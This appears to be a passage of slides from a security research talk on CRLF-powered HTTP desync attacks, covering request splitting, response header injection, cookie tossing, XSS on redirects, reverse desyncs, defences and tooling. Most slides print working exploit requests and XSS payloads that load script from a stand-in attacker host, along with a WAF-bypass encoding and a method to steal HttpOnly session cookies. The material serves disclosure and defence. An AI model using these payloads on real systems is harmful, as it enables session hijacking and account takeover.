HTTP/2 206 Partial Content Content-Type: text/html Content-Range: bytes 1-650/X Content-Length: X HTTP/1.1 400 Bad Request "Unexpected token '<, \"<script/src=\\atk.cc> \" is not validJSON" No closing script tag!

<script/src=\\atk.cc>§ HTTP/2 Host: proxy.account.software.com

**65%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 73

## **Browser-Powered Request Splitting**

GET /docs/index.html §? HTTP/1.1 Host: proxy.account.software.com Expect: 100-continue Range: bytes=1-2 HEAD /docs/ HTTP/1.1 Host: proxy.account.software.com Range: bytes=1-650

POST /docs/ HTTP/1.1 Host: proxy.account.software.com Content-Length: 20

<script/src=\\atk.cc>GET /index.html HTTP/1.1 Range: bytes=2828-2836 9 bytes X: x§ HTTP/2 Host: proxy.account.software.com

HTTP/2 206 Partial Content Content-Type: text/html Content-Range: bytes 1-650/X Content-Length: X HTTP/1.1 400 Bad Request "Unexpected token '<, \"<script/src=\\atk.cc> \" is not validJSON"HTTP/1.1 206 Content-Range: bytes 2828-2836/X Content-Length: 9 </script>

**66%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 74

## **Browser-Powered Request Splitting**

GET /docs/index.html §? HTTP/1.1 Host: proxy.account.software.com Expect: 100-continue Range: bytes=1-2 HEAD /docs/ HTTP/1.1 Host: proxy.account.software.com Range: bytes=1-650 POST /docs/ HTTP/1.1 Host: proxy.account.software.com Content-Length: 20

<script/src=\\atk.cc>GET /index.html HTTP/1.1 Range: bytes=2828-2836 X: x§ HTTP/2 Host: proxy.account.software.com

Now we have a browser issuable desync which **_inconsistently_** returns our XSS payload. Speed is our ally to make sure we hit the XSS. window.open() + location ● not consistent enough.

**IFRAMES**

**67%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 75

## **Browser-Powered Request Splitting - Iframe Madness**

https://attacker.com

</>

**68%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 76

## **Browser-Powered Request Splitting - Iframe Madness**

https://attacker.com

</> </>

**68%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 77

## **Browser-Powered Request Splitting - Iframe Madness**

https://attacker.com

</> </> </> </>
</> </> </> </>

**69%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 78

## **Browser-Powered Request Splitting - Iframe Madness**

https://attacker.com

</> </> </> </>
</> </> </> </>

**70%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 79

## **Browser-Powered Request Splitting - Iframe Madness**

https://attacker.com

</> </> </> </>
</> </> </> </>

**71%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 80

## **Browser-Powered Request Splitting - Iframe Madness**

https://attacker.com

</> </> </> </>
 By tweaking how fast we create
XSS
and delete iframes we can tune the
</> </> </> </>
RPS needed, triggering the XSS
without crashing the browser tab

**72%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 81

## **Browser-Powered Request Splitting**

$3,255

Exploit takes ~10s. Chained with a CORS misconfig we could extract authentication tokens and victim’s PII **from the XSSed iframe.**

Depends on weak SameSite cookie settings to work

 Credit: PortSwigger

**73%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 82

## **Browser-Powered Request Splitting - Bypassing HttpOnly**

GET /api/footer §? HTTP/1.1

HEAD /abc HTTP/1.1 Host: accounts.shop.com

GET /static?<script/src=\\atk.cc/s.js> HTTP/1.1 Host: accounts.shop.com

HTTP/1.1 200 OK Content-Length 17982 Content-Type: text/html Content-Length: 17982 HTTP/1.1 301 Moved Permanently Location: /?<script/src=\\atk.cc/s.js>

GET / HTTP/1.1 Host: accounts.shop.com X: x§ HTTP/2 Host: account.shop.com Cookie: session=victim

… …

**74%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 83

## **Browser-Powered Request Splitting - Bypassing HttpOnly**

GET /api/footer §? HTTP/1.1

HEAD /abc HTTP/1.1 Host: accounts.shop.com

GET /static?<script/src=\\atk.cc/s.js> HTTP/1.1 Host: accounts.shop.com

HTTP/1.1 200 OK Content-Length 17982 Content-Type: text/html Content-Length: 17982 HTTP/1.1 301 Moved Permanently Location: /?<script/src=\\atk.cc/s.js>

GET /api/account HTTP/1.1 Host: accounts.shop.com X: x§ HTTP/2 Host: account.shop.com Cookie: session=victim

… Victim’s session cookie HTTP/1.1 200 OK                              reflected in **body**

Content-Type: application/json Set-Cookie: Session=victim; HttpOnly {"email":"victim@gmail.com",... }

**75%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 84

## **Browser-Powered Request Splitting - Bypassing HttpOnly**

https://attacker.com w = window.open(payload)

CLICK ME!

**76%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 85

## **Browser-Powered Request Splitting - Bypassing HttpOnly**

https://attacker.com https://accounts.shop.com/%3f%20%48%54%54%50 w = window.open(payload) **CLICK ME!**

**77%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 86

## **Browser-Powered Request Splitting - Bypassing HttpOnly**

https://attacker.com https://accounts.shop.com/%3f%20%48%54%54%50 w = window.open(payload) w2 = window.open(payload) https://accounts.shop.com/%3f%20%48%54%54%50

CLICK ME!

**77%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 87

## **Browser-Powered Request Splitting - Bypassing HttpOnly**

https://attacker.com https://accounts.shop.com/%3f%20%48%54%54%50 w = window.open(payload) w2 = window.open(payload) setInterval(() => { w.location = payload w2.location = payload https://accounts.shop.com/%3f%20%48%54%54%50 }, 1000) **CLICK ME!**

**78%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 88

## **Browser-Powered Request Splitting - Bypassing HttpOnly**

https://attacker.com https://accounts.shop.com/%3f%20%48%54%54%50 w = window.open(payload) w2 = window.open(payload) setInterval(() => { w.location = payload w2.location = payload https://accounts.shop.com/%3f%20%48%54%54%50 }, 1000) <script/src=\\atk.cc/s.js> **CLICK ME!**

<script/src=\\atk.cc/s.js> HTTP/1.1 200 OK Set-Cookie: session=victim; HttpOnly

**79%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 89

## **Browser-Powered Request Splitting - Bypassing HttpOnly**

https://attacker.com https://accounts.shop.com/%3f%20%48%54%54%50 XSSed tab reads cookie from page content and exfils with postMessage, attack stops. https://accounts.shop.com/%3f%20%48%54%54%50

XSSed tab reads cookie from page content and exfils with postMessage, attack stops. **CLICK ME!**

<script/src=\\atk.cc/s.js> HTTP/1.1 200 OK Set-Cookie: session=victim; HttpOnly

$???

**80%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 90

**Response Header Injection**

## Slide 91

## **Response Header Injection**

   - Well known bug class often only really useful for client-side exploits

      - Cookie tossing

      - XSS (hard!)

      - Downgrading other security features with header overwrites or removals (gadgets)

- # nginx.conf

...

GET /%0d%0aX-In-Hdr:%201%0d%0a%0d%0a HTTP/1.1 Host: sub.example.com

location / { return 302 https://example.com$uri; HTTP/1.1 302 Moved Temporarily } Server: nginx Location: https://example.com/ X-In-Hdr: 1

**82%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 92

## **Response Header Injection**

   - Well known bug class often only really useful for client-side exploits

      - Cookie tossing

      - XSS (hard!)

      - Downgrading other security features with header overwrites or removals (gadgets)

- # nginx.conf

...

GET /%0d%0aX-In-Hdr:%201%0d%0a%0d%0azzz HTTP/1.1 Host: sub.example.com

location / { return 302 https://example.com$uri; HTTP/1.1 302 Moved Temporarily } Server: nginx Location: https://example.com/ X-In-Hdr: 1 zzz

**83%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 93

## **Cookie Tossing**

GET /%0d%0aSet-Cookie:%20Sess=abc%0d%0a%0d%0a HTTP/1.1 Host: www.doomscroll.com

HTTP/1.1 302 Moved Temporarily Location: /404?prev_url=/ Set-Cookie: Session=abc

- Allows us to set cookies into the victim’s browser.

   - Sensitive actions saved on attacker’s account

   - Cookie values embedded on page (XSS)

   - Target specific flows which are depended on certain cookies

cookie tossing!cookie tossing!

**84%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 94

## **Cookie Tossing - Major Social Media Platform**

GET /%0d%0aSet-Cookie:%20Session=attacker%20path%3 D%2fdoomscroll%2fweb%2fproject%2fpost%2fv1%2f% 3B%20domain%3Ddoomscroll.com%3B%20%0d%0aSet-Co okie:%20Session=attacker%20path%3D%2fapi%2fv1% 2fvideo%2fupload%2fauth%2f%3B%20domain%3Ddooms croll.com%3B%20%0d%0a%0d%0a HTTP/1.1 Host: www.doomscroll.com

cookie tossing!cookie tossing!

HTTP/1.1 302 Moved Temporarily Location: /404?prev_url=/

Set-Cookie: Session=attacker path=/doomscroll/web/project/; domain=doomscroll.com; Set-Cookie: Session=attacker path=/api/v1/video/upload/auth/; domain=doomscroll.com;

…

**85%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 95

## **Cookie Tossing - Major Social Media Platform**

$4,500

p rivate

Session=attacker path=/doomscroll/web/project/post/v1/; Session=attacker path=/api/v1/video/upload/auth/;

**86%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 96

## **Cookie Tossing - Major Social Media Platform**

p rivate Attacker gains access to “private” video uploaded to their account

Session=attacker path=/doomscroll/web/project/post/v1/; Session=attacker path=/api/v1/video/upload/auth/;

$4,500

**86%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 97

## **Response Header Injection to XSS**

- XSS was really hard to achieve as in most cases we were always dealing with a 3xx response with a valid Location header.

● Our goal is to have the browser not redirect but instead process our injected body.

Injection occurs after path (no scheme change)

Second Location header is rejected by the browser

HTTP/1.1 302 Moved Temporarily Server: nginx Location: https://example.com/ <script>alert(1)</script>

**87%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 98

## **Hunting for special Origin Response Headers**

- As part of our methodology we fuzzed for injected response headers that would cause whatever is in front of the Origin to apply transformations to the response.

- Collect headers from Akamai, AWS, Cloudflare, Azure and so on.

X-Edge-Function: drop_tables
Edge

**88%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 99

## **XSS on a Redirect Response?**

/abc%0d%0aCDN-Cache-Control:%20private=%22Location%22%0d%0a%0d%0a<script>alert(1)</script>

HTTP/1.1 301 Moved Permanently Content-Length: 25 Server: nginx Location: https://example.com/abc CDN-Cache-Control: private="Location" <script>alert(1)</script> **@joaxcar**

**89%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 100

## **XSS on a Redirect Response?**

/abc%0d%0aCDN-Cache-Control:%20private=%22Location%22%0d%0a%0d%0a<script>alert(1)</script>

https://sub.example.com

HTTP/1.1 301 Moved Permanently Content-Length: 27 Server: nginx Location: https://example.com/abc CDN-Cache-Control: private="Location" <script>alert(1)</script>

**@joaxcar**

**90%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 101

## **XSS on a Redirect Response?**

/abc%0d%0aCDN-Cache-Control:%20private=%22Location%22%0d%0a%0d%0a<script>alert(1)</script>

https://sub.example.com HTTP/1.1 301 Moved Permanently Content-Length: 27 Location header stripped Server: cloudflare CDN-Cache-Control: private="Location" <script>alert(1)</script>

**91%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 102

## **XSS on a Redirect Response?**

WAF /abc%0d%0aCDN-Cache-Control:%20private=%22Location%22%0d%0a%0d%0a<script>alert(1)</script>

https://sub.example.com

HTTP/1.1 301 Moved Permanently Content-Length: 27 Server: cloudflare CDN-Cache-Control: private="Location" <script>alert(1)</script>

**92%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 103

## **XSS on a Redirect Response?**

%3C%73%63%72%1B%28%42%69%70%74%3E%61%6C%65%72%74%1B%28%42%28%31%1B%28%42%29%3C%2F%73%63%72%1B%28%42%69%70%74%3E

https://sub.example.com

<script>alert(1)</script>

HTTP/1.1 301 Moved Permanently Content-Length: 27 Server: cloudflare CDN-Cache-Control: private="Location" Content-Type: text/html; charset=ISO-2022-JP <scr(Bipt>alert(B(1(B)</scr(Bipt>

$???

**93%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 104

## **Response Splitting - Reverse Desync**

GET /%0d%0aContent-Length:%200%0d%0a%0d%0a HTTP/1.1 Host: www.reverse.com

Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics

Amit Klein - 2004

HTTP/1.1 302 Moved Temporarily Location: /home/index.html Content-Length: 0 Connection: keep-alive Moved Temporarily to /index.html

**94%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 105

## **Response Splitting - Reverse Desync**

Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics

Amit Klein - 2004

GET /%0d%0aContent-Length:%200%0d%0a%0d%0a HTTP/1.1 Host: www.reverse.com

Making HTTP header injection critical via response queue poisoning James Kettle - 2022

HTTP/1.1 302 Moved Temporarily Location: /home/index.html Content-Length: 0 Connection: keep-alive Moved Temporarily to /index.html

GET /§ Content-Length: 0 HTTP/1.1 200 OK Server: attacker § HTTP/1.1 Host: www.reverse.com

HTTP/1.1 302 Moved Temporarily Location: /home/index.html Content-Length: 0 Split into **two** responses HTTP/1.1 200 OK Server: attacker Moved Temporarily to /index.html

**95%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 106

## **Coordinated Disclosure Process**

$32,000 There’s lots more out there to be exploited. Bug bounty hunters do your thing **Let us know in DMs!**

**95%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 107

## **Defence**

$request_uri

$uri $document_uri

Use **HTTP/2**

Not a / and not whitespace

location ~ /docs/([^/\s]*)? { … $1 … }

location ~ /docs/([^/]*)? { … $1 … }

**96%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 108

## **Tooling & Materials**

https://github.com/t0xodile/crlf-powered-desync-scanner https://github.com/turtlesec-software/crlf-desyncs

**97%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 109

# **Further Research**

Request header injection via non-path insertion points Reverse Desyncs via response header injection More methods of injecting headers rather than mutating them Lost In Ⲧ𝖗𝛂ռ𝔰𝕝𝚊𝔱Ꭵ𝞼𝘯Ⲧ𝖗𝛂ռ𝔰𝕝𝚊𝔱Ꭵ𝞼𝘯ռ𝔰𝕝𝚊𝔱Ꭵ𝞼𝘯𝔰𝕝𝚊𝔱Ꭵ𝞼𝘯: Exploiting Mutated alternativ es of the CRLF sequence 𝕏 **@t0xodile | @t0xodile.com** Unicode Normalization

Lost In Ⲧ𝖗𝛂ռ𝔰𝕝𝚊𝔱Ꭵ𝞼𝘯Ⲧ𝖗𝛂ռ𝔰𝕝𝚊𝔱Ꭵ𝞼𝘯ռ𝔰𝕝𝚊𝔱Ꭵ𝞼𝘯𝔰𝕝𝚊𝔱Ꭵ𝞼𝘯: Exploiting Unicode Normalization Ryan & Isabella Barnett - 2025

## Slide 110

# **CRLF-Powered Desync Attacks**

Header injections are not a low-impact bug. See CRLF-Powered Desync Worm CRLF-Powered desyncs can achieve impact where other desync classes fail Desyncs from header injections aren't going anywhere while nginx exists

https://turtlesec.io

𝕏 **@t0xodile | @t0xodile.com @t0xodile | @t0xodile.com @m4st3rspl1nt3r | @turtlesec.io**

## Slide 111

# **CRLF-Powered Desync Attacks**

https://turtlesec.io

**https://turtlesec.io/blog/posts/crlf-powered-desync-attacks/ https://p** 𝕏 **ortswigger.net/research/crlf-powered-desync-att@t0xodile | @t0xodile.com acks @t0xodile | @t0xodile.com @m4st3rspl1nt3r | @turtlesec.io**
